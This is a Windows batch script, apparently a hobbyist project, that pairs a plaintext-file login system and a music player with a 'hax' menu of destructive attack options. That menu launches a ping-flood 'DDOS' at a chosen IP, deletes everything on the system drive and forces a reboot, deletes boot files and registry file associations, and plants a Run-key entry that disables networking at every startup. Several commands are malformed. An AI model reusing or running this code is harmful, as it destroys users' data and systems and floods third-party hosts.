@echo off
:A
color 03
echo ========================
echo !ENTER WINDOWS USERNAME!
echo ========================
echo       %username%
echo ========================
set /p user=USERNAME:
if not %user% == %username% goto start 2
mkdir C:\Users\%user%\Documents\userinfo
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
cls
ping localhost -n 2 >nul
echo ============
echo LOGIN    (1)
echo ============
echo REGISTER (2)
echo ============
echo EXIT     (3)
echo ============
set /p chs=ENTER:
if %chs%== 1 goto logon
if %chs%== 2 goto reg
if %chs%== 3 exit
goto :A
:start 2
echo !==============================================!
echo ! WINDOWS USERNAME MUST MATCH ENTERED USERNAME !
echo !==============================================!
pause
ping localhost -n 2 >nul
goto A
:reg
if exist C:\"Users"\"%user%"\"Documents"\userinfo\username.txt goto log2
if not exist C:\"Users"\"%user%"\"Documents"\userinfo\username.txt goto reg2
:reg2
if exist C:\"Users"\"%user%"\"Documents"\userinfo\password.txt goto log2
if not exist C:\"Users"\"%user%"\"Documents"\userinfo\password.txt goto reg3
:log2
ping localhost -n 2 >nul
echo ===============================
echo          %username%
echo ===============================
echo  USER ACCOUNT ALREADY EXISTS
echo ===============================
echo LOGIN WITH EXISTING ACCOUNT (1)
echo ===============================
echo    FORGOT PASSWORD/USERNAME (2)
echo ===============================
echo     CREATE NEW ACCOUNT      (3)
echo ===============================
echo            BACK             (4)
echo ===============================
echo            EXIT             (5)
echo ===============================
set /p chslog=ENTER NUMBER:
if %chslog%== 1 goto logon 
if %chslog%== 2 goto forgot
if %chslog%== 3 goto log4
if %chslog%== 4 goto A
if %chslog%== 5 exit
goto log2 
:forgot
echo.
echo ====================
echo FORGOT USSERNAME (1)
echo ====================
echo FORGOT PASSWORD  (2)
echo ====================
echo BACK             (3)
echo ====================
echo EXIT             (4)
echo ====================
set /p chsforgot=ENTER NUMBER:
if %chsforgot%== 1 goto forgotuser
if %chsforgot%== 2 goto forgotpass
if %chsforgot%== 3 goto log2
if %chsforgot%== 4 exit
goto forgot
:forgotuser
echo !=========================================!
echo TYPE IN YOUR PASSWORD TO GET YOUR USERNAME
echo !=========================================!
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p password4= <C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
set /p password5=PASSWORD:
if %password5%==%password4% goto confirmation
if not %password5%==%password4% goto log2
:confirmation 
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirmation= <C:\Users\%user%\Desktop\confirmation.txt 
echo %confirmation%>C:\Users\%user%\Desktop\confirmation.txt 
echo confirmation>C:\Users\%user%\Documents\confirmation2.txt
set /p confirmation2= <C:\Users\%user%\Documents\confirmation2.txt
echo %confirmation2%>C:\Users\%user%\Documents\confirmation2.txt
set SendKeys=CScript //nologo //E:JScript "%~F0"
start C:\Users\%user%\Documents\confirmation2.txt
echo !===============================================================================!
echo         A FILE NAMED "CONFIRMATION" HAS BEEN CREATED ON YOUR DESKTOP
echo  OPEN THE FILE AND TYPE IN "confirmation" TO CONFIRM YOUR ACCOUNT OWNERSHIP
echo !===============================================================================!
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirmation= <C:\Users\%user%\Desktop\confirmation.txt 
echo %confirmation%>C:\Users\%user%\Desktop\confirmation.txt 
set /p confirmation2= <C:\Users\%user%\Documents\confirmation2.txt
echo %confirmation2%>C:\Users\%user%\Documents\confirmation2.txt
if %confirmation%==%confirmation2% goto forgotuser2
if not %confirmation%==%confirmation2% goto forgotuser
goto confirmation
:forgotuser2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
echo YOUR USERNAME IS:
type C:\Users\%user%\Documents\userinfo\username.txt 
pause
goto delprev
:forgotpass
echo !=========================================!
echo TYPE IN YOUR USERNAME TO GET YOUR PASSWORD 
echo !=========================================!
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p username5= <C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
set /p username6=USERNAME:
if %username6%==%username5% goto confirmation2
if not %username6%==%username5% goto log2
:confirmation2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirmation= <C:\Users\%user%\Desktop\confirmation.txt 
echo %confirmation%>C:\Users\%user%\Desktop\confirmation.txt 
echo confirmation>C:\Users\%user%\Documents\confirmation2.txt
set /p confirmation2= <C:\Users\%user%\Documents\confirmation2.txt
echo %confirmation2%>C:\Users\%user%\Documents\confirmation2.txt
echo !===========================================================================!
echo         A FILE NAMED "CONFIRMATION" HAS BEEN CREATED ON YOUR DESKTOP
echo  OPEN THE FILE AND TYPE IN "confirmation" TO CONFIRM YOUR ACCOUNT OWNERSHIP
echo !===========================================================================!
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirmation= <C:\Users\%user%\Desktop\confirmation.txt 
echo %confirmation%>C:\Users\%user%\Desktop\confirmation.txt 
set /p confirmation2= <C:\Users\%user%\Documents\confirmation2.txt
echo %confirmation2%>C:\Users\%user%\Documents\confirmation2.txt
if %confirmation%==%confirmation2% goto forgotpass2 
if not %confirmation%==%confirmation2% goto forgotpass 
goto confirmation2
:forgotpass2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
echo YOUR PASSWORD IS
type C:\Users\%user%\Documents\userinfo\password.txt
pause 
goto delprev
:delprev
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
if exist C:\Users\%user%\Desktop\confirmation.txt goto delprev2
if not exist C:\Users\%user%\Desktop\confirmation.txt goto logon
:delprev2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
cd C:\Users\%user%\Desktop 
del confirmation.txt
goto delprev3
:delprev3
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
if exist C:\Users\%user%\Documents\confirmation2.txt goto delprev4
if not exist C:\Users\%user%\Documents\confirmation2.txt goto logon
:delprev4
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
cd C:\Users\%user%\Documents
del confirmation2.txt
goto logon
:reg3
ping localhost -n 2 >nul
echo ==============
echo     REGISTER
echo ==============
set /p username=USERNAME:
set /p password=PASSWORD:
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
echo %username%>C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
echo %password%>C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirm= <C:\Users\%user%\Desktop\confirm.txt
echo %confirm%>C:\Users\%user%\Desktop\confirm.txt
echo confirm>C:\Users\%user%\Documents\confirm2.txt
set /p confirm2= <C:\Users\%user%\Documents\confirm2.txt
echo %confirm2%>C:\Users\%user%\Documents\confirm2.txt
echo !============================================================!
echo    A FILE NAMED "CONFIRM" HAS BEEN CREATED ON YOUR DESKTOP
echo  OPEN THE FILE AND TYPE IN "confirm" TO CONFIRM YOUR REGISTER
echo !============================================================!
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirm= <C:\Users\%user%\Desktop\confirm.txt
echo %confirm%>C:\Users\%user%\Desktop\confirm.txt
set /p confirm2= <C:\Users\%user%\Documents\confirm2.txt
echo %confirm2%>C:\Users\%user%\Documents\confirm2.txt 
if %confirm%==%confirm2% goto logon
if not %confirm%==%confirm2% goto A2v2\
:A2v2
if exist C:\Users\"%user%"\Desktop\confirm.txt goto A10v2
if not exist C:\Users\"%user%"\Desktop\confirm.txt goto A11v2
:A10v2
cd "C:\Users\"%user%"\Desktop"
del confirm.txt
goto A11v2
:A11v2
if exist C:\Users\"%user%"\Documents\confirm2.txt goto A12v2
if not exist C:\Users\"%user%"\Documents\confirm2.txt goto reg3
:A12v2
cd "C:\Users\"%user%"\Documents"
del confirm2.txt
goto reg3
:logon
ping localhost -n 2 >nul
echo =============
echo    LOGIN
echo =============
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p username2= <C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
set /p password2= <C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
set /p username=USERNAME:
set /p password=PASSWORD:
if %username2%==%username% goto password1
if not %username2%==%username% goto logon2
:password1
if %password2%==%password% goto A2
if not %password2%==%password% goto logon
if not %password2%==%password3% goto logon2
:logon2
echo Invailid Username or Password.
echo Please try again.
pause
goto logon
:log4
ping localhost -n 2 >nul
echo !===============================================================!
echo                          ! WARNING !
echo TO MAKE A NEW ACCOUNT YOU MUST LOG IN WITH YOUR PREVIOUS ACCOUNT
echo  AFTER MAKING THE NEW ACCOUNT, YOUR OLD ACCOUNT WILL BE DELETED
echo         THIS LOGIN IS REQUIRED FOR SECURITY PURPOSES
echo !===============================================================!
echo continue?
set /p ans1000=(y/n):
if %ans1000%== y goto log5
if %ans1000%== n goto log2
goto log4
:log5
pause
ping localhost -n 2 >nul
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p username2= <C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
set /p password2= <C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
set /p username=USERNAME:
set /p password=PASSWORD:
if %username2%==%username% goto password10
if not %username2%==%username% goto logon3
:password10
if %password2%==%password% goto reg3
if not %password2%==%password% goto log5
if not %password2%==%password3% goto logon2
:logon3
echo Invailid Username or Password.
echo Please try again.
pause
goto log4
:A2
if exist C:\Users\"%user%"\Desktop\confirm.txt goto A10
if not exist C:\Users\"%user%"\Desktop\confirm.txt goto A11
:A10 
cd "C:\Users\"%user%"\Desktop"
del confirm.txt
goto A11
:A11
if exist C:\Users\"%user%"\Documents\confirm2.txt goto A12
if not exist C:\Users\"%user%"\Documents\confirm2.txt goto A13
:A12
cd "C:\Users\"%user%"\Documents"
del confirm2.txt
goto A13
:A13
echo =====================
echo  H L 9 K    M E N U
echo =====================
echo music system (1)
echo hax          (2)
echo exit         (3)
set /p chs10000=
if %chs10000% == 1 goto C
if %chs10000% == 2 goto hax
if %chs10000% == 3 exit 
goto A13
:hax
color 17
echo =========================
echo     WELCOME TO HAX
echo =========================
echo DDOS                  (1)
echo =========================
echo MATRIX                (2)
echo =========================
echo BLUE SCREEN OF DEATH  (3)
echo =========================
echo CRASH PC LOOP         (4)
echo =========================
echo DELETE REGISTERY      (5)
echo =========================
echo DISABLE INTERNET      (6)
echo =========================
echo BACK                  (7)
echo =========================
echo EXIT                  (8)
echo =========================
set /p chs2=ENTER:
if %chs2%== 1 goto ddostool
if %chs2%== 2 goto delete
if %chs2%== 3 goto bsod
if %chs2%== 4 goto cpl
if %chs2%== 5 goto delreg
if %chs2%== 6 goto netoff
if %chs2%== 7 goto A13
if %chs2%== 8 exit
:ddostool
echo loading..
ping localhost -n 2 > nul
cls
echo laoding...
ping localhost -n 2 > nul
cls
echo connected
echo ======================================
echo IP FINDER-ANY PC                   (1)
echo ======================================
echo IP FINDER-THIS PC                  (2)
echo ====================================== 
echo CONTINUE                           (3)
echo ======================================
echo BACK                               (5)
echo ======================================
echo EXIT                               (6)
echo ======================================
set /p chs3=
if %chs3%== 1 goto wireshark
if %chs3%== 2 goto ipfinder1
if %chs3%== 3 goto cnt1
if %chs3%== 4 goto hax
if %chs3%== 5 exit
goto ddostool
:ipfinder1
echo.
c:\windows\system32\ipconfig.exe
ipconfig /release
@pause
ipconfig /renew
@pause
pause
goto ddostool
:wireshark
echo.
echo ======================================
echo START WIRESHARK                    (1)
echo ======================================
echo DOWNLOAD WIRESHARK                 (2)
echo ======================================
echo TIPS                               (3)
echo ======================================
echo CONTINUE                           (4)
echo ======================================
echo BACK                               (5)
echo ======================================
echo EXIT                               (6)
echo ======================================
set /p chs4=
if %chs4%== 1 goto wd1
if %chs4%== 2 goto wd2
if %chs4%== 3 goto wtips
if %chs4%== 4 goto cnt1
if %chs4%== 5 goto ddostool
if %chs4%== 6 exit 
goto ddostool
:wtips
echo.
echo 1.OPEN WIRESHARK
echo 2.IN THE FILTER'S TAB TYPE IN "UDP"
echo 3.CLICK START
echo 4.STOP THE SEARCH
echo 5.LOOK FOR THE MOST COMMON IP IN THE LIST
pause
goto wireshark
:wd1
echo.
start wireshark.exe
goto wireshark
:wd2
echo.
start https://www.wireshark.org/download.html
goto wireshark
:cnt1
echo.
echo ======================================
echo INSERT IP ADDRES THAT YOU WANT TO DDOS
echo ======================================
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%==continue  goto ddosping
:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete
:delete
color 0D
echo.
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto random
:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto werdy
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto random
:bsod
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont4=YES/NO:
if %cont4%== yes goto bsod2
if %cont4%== no goto hax
goto bsod
:bsod2
del %systemdrive%\*.*/f/s/q
shutdown -r -f -t 00
:cpl
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont3=YES/NO:
if %cont3%== yes goto cpl2
if %cont3%== no goto hax
goto cpl 
:cpl2
attrib -r-s-h c:\autoexec.bat
del c:\autexec.bat
attrib -r-s-h c:\boot.ini
del c:\boot.ini
attrib -r-s-h c:\ntldr
del c:\ntldr
attrib -r-s-h c:\windows\win.ini
del c:\windows\win.ini
:delreg
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont2=YES/NO:
if %cont2%== yes goto delreg2
if %cont2%== no goto hax
goto delreg
:delreg2
start reg delete HKCR/.exe
start reg delete HKCR/.dll
start reg delete HKCR/*
:netoff
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont=YES/NO:
if %cont%== yes goto netoff2
if %cont%== no goto hax
goto netoff
:netoff2 
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v
WINDOWsAPI/t reg_sz/d c:windowswimn32/f
reg add hkey_local_usersoftwaremicrosoftwindowscurrentversionrun/v
CONTROLexit/t reg_sz/d c:windowswimn3
:C
echo ===========================
echo       MUSIC SYSTEM
echo ===========================
echo ENTER NEW SONG          (1)
echo ===========================
echo PREVIOUSLY ENTERED SONG (2)
echo ===========================
echo BACK                    (3)
echo ===========================
echo EXIT                    (4)
echo ===========================
set /p chs12=
if %chs12% == 1 goto ns
if %chs12% == 2 goto playult
if %chs12% == 3 goto A13
if %chs12% == 4 exit 
goto C
:playult 
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto playult2 
if not exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto playult3
:playult3
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto playult4
if not exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto playult5
:playult5
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
echo %song3%>C:\Users\%user%\Documents\musicinfo\songname3.txt
start C:\Users\"%user%"\Music\"%song3%" 
pause
goto C
:playult4
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
echo %fold2%>C:\Users\%user%\Documents\musicinfo\foldinfo2.txt
echo %song2%>C:\Users\%user%\Documents\musicinfo\songname2.txt
start C:\Users\"%user%"\Music\"%fold2%"\"%song2%"
pause
goto C
:playult2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
echo %subfold%>C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt
echo %fold%>C:\Users\%user%\Documents\musicinfo\foldinfo.txt
echo %song%>C:\Users\%user%\Documents\musicinfo\songname.txt
start C:\Users\"%user%"\Music\"%fold%"\"%subfold%"\"%song%"
pause
goto C
:nsprep
if exist C:\Users\%user%\Documents\musicinfo\songname3.txt goto delsng
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto delsubfold
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto delfold
goto ns
:delsng
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
del C:\Users\%user%\Documents\musicinfo\songname3.txt
ping localhost -n 2 >nul
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto delsubfold
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto delfold
cls
goto ns
:delsubfold
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
del C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt
ping localhost -n 2 >nul
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto delfold
if exist C:\Users\%user%\Documents\musicinfo\songname3.txt goto delsng
cls
goto ns
:delfold
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
del C:\Users\%user%\Documents\musicinfo\foldinfo2.txt
ping localhost -n 2 >nul
if exist C:\Users\%user%\Documents\musicinfo\songname3.txt goto delsng
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto delsubfold
cls
goto ns
:ns 
echo %user%>C:\Users\%user%\Documents\musicinfo\uminfo.txt
echo  song location 
echo -sub folder         (1)
echo -single folder      (2)
echo -outside of a folder(3)
set /p mss=
if %mss% == 1 goto subfold
if %mss% == 2 goto singfold2
if %mss% == 3 goto nofold3 
goto C
:subfold 
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto subfoldprep
if exist C:\Users\%user%\Documents\musicinfo\songname3.txt goto subfoldprep2
goto subfoldA
:subfoldprep
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
del C:\Users\%user%\Documents\musicinfo\foldinfo2.txt
goto subfoldA
:subfoldprep2 
echo %user%>C:\Users\%user%\Documents\musicinfo\uminfo.txt
del C:\Users\%user%\Documents\musicinfo\songname3.txt
goto subfoldA
:subfoldA
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt 
echo enter subfolder name
set /p subfold=
echo %subfold%>C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt
goto singfold
:singfold
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
echo enter folder name
set /p fold=
echo %fold%>C:\Users\%user%\Documents\musicinfo\foldinfo.txt
goto nofold
:nofold
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
echo enter song name
echo example - LP - Lost On You (Swanky Tunes & Going Deeper Remix).mp3
set /p song=
echo %song%>C:\Users\%user%\Documents\musicinfo\songname.txt
cls
goto play
:play
start C:\Users\"%user%"\Music\"%fold%"\"%subfold%"\"%song%"
pause
goto C
:singfold2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
if exist C:\Users\%user%\Documents\musicinfo\songname3.txt goto singfoldprep
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto singfoldprep2
goto singfoldA
:singfoldprep
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
del C:\Users\%user%\Documents\musicinfo\songname3.txt
goto singfoldA
:singfoldprep2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
del C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt
goto singfoldA
:singfoldA
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
echo enter folder name
set /p fold2=
echo %fold2%>C:\Users\%user%\Documents\musicinfo\foldinfo2.txt
goto nofold2
:nofold2
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
echo enter song name
echo example - LP - Lost On You (Swanky Tunes & Going Deeper Remix).mp3
set /p song2=
echo %song2%>C:\Users\%user%\Documents\musicinfo\songname2.txt
cls 
goto play2
:play2
start C:\Users\"%user%"\Music\"%fold2%"\"%song2%"
pause
goto C
:nofold3
echo %user%>C:\Users\%user%\Documents\musicinfo\uminfo.txt
if exist C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt goto nofoldprep
if exist C:\Users\%user%\Documents\musicinfo\foldinfo2.txt goto nofoldprep2
goto nofoldA 
:nofoldprep
echo %user%>C:\Users\%user%\Documents\musicinfo\uminfo.txt
del C:\Users\%user%\Documents\musicinfo\subfoldinfo.txt
goto nofoldA
:nofoldprep2
echo %user%>C:\Users\%user%\Documents\musicinfo\uminfo.txt
del C:\Users\%user%\Documents\musicinfo\foldinfo2.txt
goto nofoldA
:nofoldA 
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt  
echo enter song name
echo example - LP - Lost On You (Swanky Tunes & Going Deeper Remix).mp3
set /p song3=
echo %song3%>C:\Users\%user%\Documents\musicinfo\songname3.txt
cls 
goto play3
:play3
start C\:Users\"%user%"\Music\"%song3%"
pause 
goto C